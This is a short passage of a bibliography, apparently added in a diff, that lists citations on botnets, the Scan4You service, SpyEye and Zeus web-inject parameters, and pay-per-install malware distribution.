+[21] Sood, A.; Bansal, R.; Enbody, R. Botnets Die Hard. Proceedings of the 20th Annual DEFCON Conference.
+[22] Scan4You Service. http://scan4you.net/.
+[23] SpyEye and Zeus Web Inject Parameters. http://secniche.blogspot.com/2011/07/spyeye-zeus-web-injects-parameters-and.html.
+[24] Caballero, J; Grier, C.; Kreibich, C.; Paxson, V. Measuring pay-per-install: the commoditization of malware distribution. 2011. Proceedings of the 20th USENIX conference on Security (SEC’11).
